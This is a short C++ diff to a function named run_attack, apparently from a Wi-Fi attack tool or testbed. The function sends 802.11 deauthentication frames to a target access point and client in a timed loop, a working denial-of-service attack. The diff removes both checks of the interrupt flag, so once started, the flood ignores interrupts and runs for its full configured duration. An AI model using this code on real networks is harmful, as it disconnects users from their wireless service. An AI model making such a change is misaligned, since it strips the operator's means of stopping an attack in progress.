@@ -50,13 +50,12 @@ void run_attack(RunStatus &rs) {
     const string iface = rs.get_actor("attacker").get(SK::iface);
 
     interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));
-    if (g_interrupted) return;
 
     log(LogLevel::INFO, "Deauth attack START");
     PacketSender sender{iface};
     RadioTap frame = make_deauth(ap_mac, sta_mac);
     const auto end = steady_clock::now() + seconds(att_cfg.at("attack_time"));
-    while (steady_clock::now() < end && !g_interrupted) {
+    while (steady_clock::now() < end) {
         sender.send(frame);
         interruptible_sleep(milliseconds(att_cfg.at("ms_interval")));
     }
